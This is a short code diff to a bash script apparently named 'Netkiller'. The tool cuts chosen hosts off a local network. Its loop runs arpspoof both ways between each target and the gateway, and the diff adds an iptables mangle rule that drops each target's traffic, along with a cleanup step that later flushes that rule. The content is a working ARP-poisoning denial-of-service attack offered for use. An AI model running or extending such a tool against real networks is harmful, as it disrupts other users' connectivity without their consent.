@@ -214,6 +214,7 @@ pkill -f arpspoof && pkill arpspoof
 ip -s -s neigh flush all >/dev/null 2>&1
 iptables -P FORWARD ACCEPT
 iptables -F FORWARD
+iptables -t mangle -F PREROUTING
 sleep 2
 echo -e "\nConnection is restored..."
 EOF
@@ -232,6 +233,7 @@ echo " "
 PIDS=()
 for TARGET in "${TARGETS[@]}"; do
     echo "Netkiller kill the target IP: $TARGET"
+     iptables -t mangle -A PREROUTING -s "$TARGET" -j DROP
    ( arpspoof -i "$INTERFACE" -c host -t "$TARGET" "$GATEWAY" >/dev/null 2>&1 ) &
     PIDS+=($!)
    ( arpspoof -i "$INTERFACE" -c host -t "$GATEWAY" "$TARGET" >/dev/null 2>&1 ) &
